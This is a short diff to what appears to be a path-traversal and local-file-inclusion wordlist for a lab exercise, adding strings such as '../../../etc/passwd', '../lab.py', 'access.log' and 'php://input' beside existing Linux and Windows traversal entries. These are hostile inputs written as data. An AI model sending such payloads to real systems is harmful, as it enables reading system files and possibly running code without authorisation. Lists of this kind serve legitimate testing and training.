@@ -4,6 +4,8 @@
 ../../../../etc/passwd
 ../../../../../../etc/passwd
 /etc/passwd
+../../../etc/passwd
+
 
 # [SECTION 2: The "Tap-Ins" (Standard Windows)]
 ../../../../windows/win.ini
@@ -55,3 +57,8 @@ c:\wamp\logs\access.log
 #lab.py
 #access.log
 #requirements.txt
+
+../lab.py
+../../../../etc/passwd
+access.log
+php://input
